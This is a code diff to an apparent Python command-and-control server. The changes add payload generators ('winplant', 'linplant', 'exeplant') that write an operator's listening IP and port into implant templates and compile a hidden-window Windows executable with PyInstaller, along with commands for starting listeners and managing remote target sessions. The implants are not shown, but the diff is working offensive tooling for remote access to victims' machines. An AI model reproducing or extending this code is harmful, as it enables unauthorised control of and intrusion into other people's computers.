@@ -1,13 +1,93 @@
+import os
+import shutil
 import socket
 import sys
 import threading
 from prettytable import PrettyTable
 import time
 from datetime import datetime
+import random
+import string
+import subprocess
 
 
-def listener_handler(host_ip, host_port):
-    sock.bind((host_ip, host_port))
+
+
+def winplant():
+    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = f'{random_name}.py'
+    check_cwd = os.getcwd()
+    if os.path.exists(f'{check_cwd}\\winplant.py'):
+        shutil.copy('winplant.py', file_name)
+    else:
+        print('[-] winplant.py file not found.')
+    with open(file_name) as f:
+        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
+    with open(file_name, 'w') as f:
+        f.write(new_host)
+        f.close()
+    with open(file_name) as f:
+            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
+    with open(file_name, 'w') as f:
+        f.write(new_port)
+        f.close()
+
+
+def linplant():
+    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = f'{random_name}.py'
+    check_cwd = os.getcwd()
+    if os.path.exists(f'{check_cwd}/linplant.py'):
+        print(f'{check_cwd}')
+        shutil.copy('linplant.py', file_name)
+    else:
+        print(f'[-] {check_cwd} \\ linplant.py file not found.')
+    with open(file_name) as f:
+        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
+    with open(file_name, 'w') as f:
+        f.write(new_host)
+        f.close()
+    with open(file_name) as f:
+            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
+    with open(file_name, 'w') as f:
+        f.write(new_port)
+        f.close()
+
+def exeplant():
+    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = f'{random_name}.py'
+    exe_file = f'{random_name}.exe'
+    check_cwd = os.getcwd()
+    if os.path.exists(f'{check_cwd}\\winplant.py'):
+        shutil.copy('winplant.py', file_name)
+    else:
+        print('[-] winplant.py file not found.')
+    with open(file_name) as f:
+        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
+    with open(file_name, 'w') as f:
+        f.write(new_host)
+        f.close()
+    with open(file_name) as f:
+            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
+    with open(file_name, 'w') as f:
+        f.write(new_port)
+        f.close()
+    if os.path.exists(f'{file_name}'):
+        print(f'[+] {file_name} saved to {check_cwd}')
+    else:
+        print('[-] Some error occured during generation')
+    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
+    print(f'[+] Compiling executable {exe_file}...')
+    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
+    os.remove(f'{random_name}.spec')
+    shutil.rmtree('build')
+    if os.path.exists(f'{check_cwd}\\{exe_file}'):
+        print(f'[+] {exe_file} saved to current directory.')
+    else:
+        print('[-] Some error occured during generation.')
+
+def listener_handler():
+    sock.bind((host_ip, int(host_port)))
     print('[+] Awaiting connection from client...')
     sock.listen()
     t1 = threading.Thread(target=communication_handler)
@@ -18,10 +98,9 @@ def target_comm_channel(target_id):
         message = input('send message#> ')
         communication_out(target_id, message)
         if message == 'exit':
-            target_id.send(message.encode())
             target_id.close()
             break
-        if message == 'background':
+        elif message == 'background':
             break
         else:
             response = communication_in(target_id)
@@ -90,20 +169,33 @@ def banner():
 if __name__ == '__main__':
     banner()
     targets = []
+    listener_counter = 0
     kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        host_ip = sys.argv[1]
-        host_port = int(sys.argv[2])
-    except IndexError:
-        print('[-] Command line argument(s) missing.  Please try again.')
-    except Exception as e:
-        print(e)
 
-    listener_handler(host_ip, host_port)
     while True:
         try:
             command = input('Enter command#> ')
+            if command == 'listeners -g':
+                host_ip = input('[+] Enter the IP address to listen on: ')
+                host_port = input('[+] Enter the port to listen on: ')
+                listener_handler()
+                listener_counter += 1
+            if command == 'winplant py':
+                if listener_counter > 0:
+                    winplant()
+                else:
+                    print('[-] You cannot generate a payload without an active listener.')
+            if command == 'linplant py':
+                if listener_counter > 0:
+                    linplant()
+                else:
+                    print('[-] You cannot generate a payload without an active listener.')
+            if command == 'exeplant':
+                if listener_counter > 0:
+                    exeplant()
+                else:
+                    print('[-] You cannot generate a payload without an active listener.')
             if command.split(" ")[0] == 'sessions':
                 session_counter = 0
                 if command.split(" ")[1] == '-l':
